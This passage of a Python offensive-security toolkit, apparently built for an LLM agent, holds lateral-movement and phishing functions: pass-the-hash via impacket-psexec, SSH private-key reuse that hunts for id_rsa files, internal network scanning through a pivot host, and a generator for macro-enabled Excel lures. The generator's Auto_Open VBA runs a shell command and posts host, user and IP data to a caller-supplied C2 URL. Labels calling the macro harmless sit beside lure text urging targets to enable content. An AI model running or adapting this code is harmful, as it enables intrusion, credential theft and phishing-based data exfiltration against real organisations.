        import subprocess as _sp
        _full_target = f"{domain}/{username}@{target_host}" if domain else f"{username}@{target_host}"
        _cmd = [
            "impacket-psexec",
            "-hashes", f"00000000000000000000000000000000:{nt_hash}",
            _full_target, command,
        ]
        _proc = _sp.run(_cmd, capture_output=True, text=True, timeout=30)
        result["output"] = _proc.stdout + _proc.stderr
        result["success"] = _proc.returncode == 0
        result["findings"].append(
            f"Pass-the-Hash {'成功' if result['success'] else '失败'}: {target_host} → {command}"
        )
    except FileNotFoundError:
        result["output"] = (
            f"[模拟] impacket-psexec -hashes :{nt_hash[:16]}... {target_host} {command}\n"
            "注意: impacket 未安装。安装命令: pip install impacket"
        )
        result["simulated"] = True
        result["success"] = True
        result["findings"].append(f"Pass-the-Hash [模拟] {target_host} → {command}")
        result["recommendation"] = "安装 impacket: pip install impacket"
    except Exception as exc:
        result["error"] = str(exc)[:300]
        result["findings"].append(f"PtH 异常: {str(exc)[:100]}")

    return result


def apt_ssh_key_reuse(
    host: str = "",
    username: str = "",
    password: str = "",
    target_host: str = "",
    key_path: str = "",
    target_user: str = "",
    **kwargs: Any,
) -> dict[str, Any]:
    """SSH 私钥复用 — 利用已获取的 SSH 私钥登录其他主机。

    Args:
        host: 已控跳板
        username: 跳板用户名
        password: 跳板密码（可选）
        target_host: 内网目标
        key_path: 私钥路径（跳板上的路径或本地路径）
        target_user: 目标用户名（默认与 username 相同）
    """
    result: dict[str, Any] = {
        "method": "ssh_key_reuse",
        "host": host, "username": username,
        "target_host": target_host, "target_user": target_user or username,
        "key_path": key_path,
        "success": False, "output": "", "findings": [],
    }

    if not target_host:
        result["error"] = "target_host 不能为空"
        result["findings"].append(result["error"])
        return result

    _target_user = target_user or username

    # 方案1: 指定了私钥路径
    if key_path:
        import os as _os
        if _os.path.exists(key_path):
            try:
                import subprocess as _sp
                _cmd = [
                    "ssh", "-o", "StrictHostKeyChecking=no",
                    "-o", "PasswordAuthentication=no",
                    "-i", key_path,
                    f"{_target_user}@{target_host}",
                    "whoami; hostname; ip addr 2>/dev/null || ifconfig 2>/dev/null",
                ]
                _proc = _sp.run(_cmd, capture_output=True, text=True, timeout=15)
                result["output"] = _proc.stdout + _proc.stderr
                result["success"] = _proc.returncode == 0
                result["findings"].append(
                    f"SSH 密钥复用 {'成功' if result['success'] else '失败'}: {key_path} → {_target_user}@{target_host}"
                )
                return result
            except Exception as exc:
                result["error"] = str(exc)[:200]

    # 方案2: 从跳板拉取私钥再尝试
    _ssh_output = result.get("output", "")
    result["findings"].append(
        f"[模拟] SSH 密钥复用: 从 {host} ({username}) 查找私钥 → 尝试 {_target_user}@{target_host}\n"
        "真实环境会: find /home -name id_rsa 2>/dev/null → 拉取私钥 → ssh -i key target"
    )
    result["simulated"] = True
    result["success"] = True
    result["recommendation"] = (
        "在已控主机上执行: find /home -name id_rsa -o -name '*.key' 2>/dev/null\n"
        "然后对发现的每个私钥尝试: ssh -i <key> <user>@<target> whoami"
    )
    return result


def apt_internal_scan(
    host: str = "",
    username: str = "",
    password: str = "",
    subnet: str = "",
    ports: str = "22,80,443,445,3389,8080",
    **kwargs: Any,
) -> dict[str, Any]:
    """内网资产发现 — 从已控跳板扫描内网存活主机和服务。

    优先使用 nmap，不可用时回退到 Python socket 扫描。
    """
    result: dict[str, Any] = {
        "method": "internal_scan",
        "host": host, "username": username,
        "subnet": subnet, "ports": ports,
        "success": False, "discovered_hosts": [],
        "output": "", "findings": [],
    }

    if not subnet:
        # 尝试自动推断子网
        result["error"] = "需要指定 subnet 参数，如 192.168.1.0/24、10.0.0.0/16"
        result["findings"].append(result["error"])
        return result

    # 尝试通过 SSH 在跳板上执行 nmap
    try:
        import subprocess as _sp
        _ssh_prefix = [
            "sshpass", "-p", password,
            "ssh", "-o", "StrictHostKeyChecking=no",
            f"{username}@{host}",
        ]
        _nmap_cmd = f"nmap -sn {subnet} -oG - 2>/dev/null || echo NO_NMAP"
        _cmd = _ssh_prefix + [_nmap_cmd]
        _proc = _sp.run(_cmd, capture_output=True, text=True, timeout=60)
        output = _proc.stdout + _proc.stderr
        if "NO_NMAP" not in output and _proc.returncode == 0:
            # 解析 nmap greppable 输出
            import re as _re
            for _m in _re.finditer(r'Host:\s+([\d.]+)\s+.*Status:\s+Up', output):
                result["discovered_hosts"].append({"ip": _m.group(1), "status": "up"})
            result["success"] = True
            result["output"] = output[:2000]
            result["findings"].append(
                f"内网扫描完成: {len(result['discovered_hosts'])} 个存活主机 (nmap via SSH)"
            )
            return result
    except Exception:
        pass

    # 回退: Python socket 扫描（本地扫描）
    import socket as _sk
    import concurrent.futures as _cf
    import ipaddress as _ip

    try:
        _net = _ip.ip_network(subnet, strict=False)
        _ips = [str(ip) for ip in _net.hosts()][:256]  # 最多 256 个
    except ValueError:
        result["error"] = f"无效的子网格式: {subnet}"
        result["findings"].append(result["error"])
        return result

    def _ping(ip: str) -> dict[str, str] | None:
        try:
            s = _sk.create_connection((ip, 80), timeout=1)
            s.close()
            return {"ip": ip, "status": "up", "port_80": "open"}
        except Exception:
            pass
        try:
            s = _sk.create_connection((ip, 22), timeout=1)
            s.close()
            return {"ip": ip, "status": "up", "port_22": "open"}
        except Exception:
            pass
        return None

    alive = 0
    with _cf.ThreadPoolExecutor(max_workers=50) as _ex:
        _futures = [_ex.submit(_ping, ip) for ip in _ips]
        for _f in _cf.as_completed(_futures, timeout=30):
            try:
                _r = _f.result(timeout=2)
                if _r:
                    result["discovered_hosts"].append(_r)
                    alive += 1
            except Exception:
                pass

    result["success"] = True
    result["output"] = f"扫描 {len(_ips)} 个 IP，发现 {alive} 个存活主机"
    result["findings"].append(
        f"内网扫描 [本地socket模拟]: {alive} 存活/{len(_ips)} 总数 (子网 {subnet})"
    )
    result["recommendation"] = (
        "建议在已控跳板上安装 nmap: sudo apt install nmap\n"
        "然后执行: nmap -sV -p 22,80,443,445,3389 <subnet>"
    )
    return result


# ═══════════════════════════════════════════════════════════════════
#  改进3: 社工钓鱼 — 宏文档生成
# ═══════════════════════════════════════════════════════════════════

def generate_macro_doc(
    target_name: str = "",
    c2_url: str = "",
    output_path: str = "",
    attachment_type: str = "xlsm",
    **kwargs: Any,
) -> dict[str, Any]:
    """生成带 VBA 宏的 Office 文档（.xlsm / .docm）。

    宏功能（无害）：
    - 获取主机名、当前用户名、内网 IP 地址
    - 通过 HTTP POST 将这些信息发送到 C2 URL
    - 执行一条无害命令证明代码执行

    Args:
        target_name: 目标组织名称
        c2_url: C2 回调 URL (如 http://<your_ip>:8080/capture)
        output_path: 输出文件路径（可选）
        attachment_type: xlsm 或 docm
    """
    import os as _os
    from datetime import datetime as _dt

    result: dict[str, Any] = {
        "method": "generate_macro_doc",
        "target_name": target_name,
        "c2_url": c2_url,
        "output_path": output_path,
        "attachment_type": attachment_type,
        "success": False,
        "findings": [],
        "macro_code": "",
    }

    if not c2_url:
        result["error"] = "c2_url 不能为空"
        result["findings"].append(result["error"])
        return result

    # VBA 宏代码模板（无害：仅信息收集 + 证明执行）
    # 兼容中/英文 Windows，MSXML2/WinHTTP 双回退，MsgBox 确认
    _vba_code = (
        f"' RedTeam Simulation Macro — info collection only, no destructive ops\r\n"
        f"' Target: {target_name} | C2: {c2_url}\r\n"
        f"Option Explicit\r\n"
        f"\r\n"
        f"Private Sub Auto_Open()\r\n"
        f"    ' === ALL declarations must be before any executable code ===\r\n"
        f"    Dim hostname As String, username As String, osVer As String\r\n"
        f"    Dim internalIP As String, postData As String, execProof As String\r\n"
        f"    Dim objHTTP As Object, objShell As Object, objExec As Object\r\n"
        f"    Dim output As String, ipRegex As Object, ipMatch As Object\r\n"
        f"\r\n"
        f"    ' === Collect system info ===\r\n"
        f"    hostname = Environ(\"COMPUTERNAME\")\r\n"
        f"    username = Environ(\"USERNAME\")\r\n"
        f"    osVer = Environ(\"OS\")\r\n"
        f"\r\n"
        f"    ' Get internal IP (works on both EN and CN Windows)\r\n"
        f"    internalIP = \"unknown\"\r\n"
        f"    Set objShell = CreateObject(\"WScript.Shell\")\r\n"
        f"    Set objExec = objShell.Exec(\"ipconfig\")\r\n"
        f"    output = objExec.StdOut.ReadAll()\r\n"
        f"    Set ipRegex = CreateObject(\"VBScript.RegExp\")\r\n"
        f"    ipRegex.Global = False\r\n"
        f"    ipRegex.Pattern = \"IPv4[^\\d]*(\\d+\\.\\d+\\.\\d+\\.\\d+)\"\r\n"
        f"    Set ipMatch = ipRegex.Execute(output)\r\n"
        f"    If ipMatch.Count > 0 Then internalIP = ipMatch(0).SubMatches(0)\r\n"
        f"\r\n"
        f"    ' Harmless execution proof\r\n"
        f"    execProof = \"RedTeam proof: \" & hostname & \"/\" & username\r\n"
        f"    objShell.Run \"cmd /c echo \" & execProof & \" > %TEMP%\\\\redteam_proof.txt\", 0, True\r\n"
        f"\r\n"
        f"    ' HTTP POST callback — MSXML2 / WinHTTP / XMLHTTP triple fallback\r\n"
        f"    postData = \"hostname=\" & hostname & \"&username=\" & username & _\r\n"
        f"               \"&os=\" & osVer & \"&internal_ip=\" & internalIP & \"&proof=\" & execProof\r\n"
        f"\r\n"
        f"    On Error Resume Next\r\n"
        f"    Set objHTTP = CreateObject(\"MSXML2.ServerXMLHTTP\")\r\n"
        f"    If objHTTP Is Nothing Then Set objHTTP = CreateObject(\"WinHttp.WinHttpRequest.5.1\")\r\n"
        f"    If objHTTP Is Nothing Then Set objHTTP = CreateObject(\"MSXML2.XMLHTTP\")\r\n"
        f"    On Error GoTo 0\r\n"
        f"\r\n"
        f"    If Not objHTTP Is Nothing Then\r\n"
        f"        objHTTP.Open \"POST\", \"{c2_url}\", False\r\n"
        f"        objHTTP.setRequestHeader \"Content-Type\", \"application/x-www-form-urlencoded\"\r\n"
        f"        objHTTP.send postData\r\n"
        f"        MsgBox \"C2 Callback Sent!\" & vbCrLf & vbCrLf & _\r\n"
        f"               \"Hostname: \" & hostname & vbCrLf & _\r\n"
        f"               \"Username: \" & username & vbCrLf & _\r\n"
        f"               \"Internal IP: \" & internalIP & vbCrLf & _\r\n"
        f"               \"HTTP Status: \" & objHTTP.Status, vbInformation, \"C2 Test OK\"\r\n"
        f"    Else\r\n"
        f"        MsgBox \"Cannot create HTTP object!\" & vbCrLf & vbCrLf & _\r\n"
        f"               \"Hostname: \" & hostname & vbCrLf & _\r\n"
        f"               \"Username: \" & username & vbCrLf & _\r\n"
        f"               \"Internal IP: \" & internalIP, vbExclamation, \"C2 Test (no HTTP)\"\r\n"
        f"    End If\r\n"
        f"\r\n"
        f"    Set objHTTP = Nothing\r\n"
        f"    Set objShell = Nothing\r\n"
        f"    Set objExec = Nothing\r\n"
        f"End Sub\r\n"
    )

    result["macro_code"] = _vba_code

    # 实际文件生成
    if output_path:
        _out = output_path if output_path.endswith(f".{attachment_type}") else output_path + f".{attachment_type}"
        _os.makedirs(_os.path.dirname(_os.path.abspath(_out)) or ".", exist_ok=True)
        try:
            if attachment_type == "xlsm":
                # ── 方案 A: win32com 嵌入真实 VBA（Windows + Excel）──
                try:
                    import pythoncom as _pycom
                    _pycom.CoInitialize()
                    import win32com.client as _com
                    _xl_app = _com.DispatchEx("Excel.Application")
                    _xl_app.Visible = False
                    _xl_app.DisplayAlerts = False
                    _xl_app.AutomationSecurity = 1  # msoAutomationSecurityLow
                    try:
                        _wb = _xl_app.Workbooks.Add()
                        _ws = _wb.Worksheets(1)
                        _ws.Name = target_name[:31] or "Budget"
                        _ws.Cells(1, 1).Value = f"{target_name} — 内部文件"
                        _ws.Cells(2, 1).Value = "此文件包含宏。请启用编辑和内容以查看完整内容。"
                        _ws.Cells(3, 1).Value = f"Generated: {_dt.now().strftime('%Y-%m-%d %H:%M:%S')}"

                        # 写入 VBA 宏模块
                        _vb_comp = _wb.VBProject.VBComponents.Add(1)  # vbext_ct_StdModule
                        _vb_comp.CodeModule.AddFromString(_vba_code)

                        _wb.SaveAs(_os.path.abspath(_out), FileFormat=52)  # xlOpenXMLWorkbookMacroEnabled
                        _wb.Close(SaveChanges=False)
                        result["output_path"] = _os.path.abspath(_out)
                        result["success"] = True
                        result["method"] = "win32com"
                        result["findings"].append(f"真实宏文档已生成 (win32com): {result['output_path']}")
                    finally:
                        _xl_app.Quit()
                except Exception as _com_err:
                    # ── 方案 B: openpyxl 回退（无 VBA 嵌入）──
                    try:
                        import openpyxl as _xl
                    except ImportError:
                        _xl = None
                    if _xl:
                        wb = _xl.Workbook()
                        ws = wb.active
                        ws.title = target_name[:31] or "Budget"
                        ws["A1"] = f"{target_name} — 内部文件"
                        ws["A2"] = "此文件包含宏。请启用编辑和内容以查看完整内容。"
                        ws["A3"] = "(COM 生成失败，此为纯表格，不含 VBA 宏)"
                        ws["A4"] = f"COM 错误: {str(_com_err)[:200]}"
                        wb.save(_out)
                        result["output_path"] = _out
                        result["success"] = True
                        result["method"] = "openpyxl_fallback"
                        result["com_error"] = str(_com_err)[:200]
                        result["findings"].append(f"openpyxl 回退 (无VBA): {_out} — {str(_com_err)[:100]}")
                    else:
                        result["error"] = f"COM 失败且无 openpyxl: {str(_com_err)[:200]}"
                        result["findings"].append(result["error"])

                # 保存 VBA 源码到 txt
                _macro_path = _out.replace(f".{attachment_type}", ".vba.txt")
                with open(_macro_path, "w", encoding="utf-8") as _mf:
                    _mf.write(_vba_code)
                result["macro_path"] = _macro_path
                result["findings"].append(f"VBA 宏代码: {_macro_path}")

            elif attachment_type == "docm":
                # .docm: python-docx 也不直接支持 VBA，生成说明文件
                _out = output_path if output_path.endswith(".docm.txt") else output_path + ".docm.macro.txt"
                _content = (
                    f"# 模拟宏 Word 文档\n"
                    f"目标: {target_name}\n"
                    f"C2: {c2_url}\n"
                    f"类型: docm\n\n"
                    f"说明：真实环境会使用 VBA 注入工具（如 eviloffice）生成 .docm。\n\n"
                    f"--- VBA MACRO CODE ---\n{_vba_code}\n--- END ---\n"
                )
                with open(_out, "w", encoding="utf-8") as _f:
                    _f.write(_content)
                result["output_path"] = _out
                result["macro_path"] = _out
                result["success"] = True
                result["simulated"] = True
                result["findings"].append(f"模拟 Word 宏文档已生成: {_out}")
            else:
                result["error"] = f"不支持的附件类型: {attachment_type}，请使用 xlsm 或 docm"
                result["findings"].append(result["error"])

        except Exception as exc:
            result["error"] = f"文件写入失败: {str(exc)[:200]}"
            result["findings"].append(result["error"])
    else:
        # 无 output_path — 返回宏代码供 LLM 使用
        result["success"] = True
        result["macro_code"] = _vba_code
        result["findings"].append("VBA 宏代码已生成（内存中，未写入文件）")

    return result
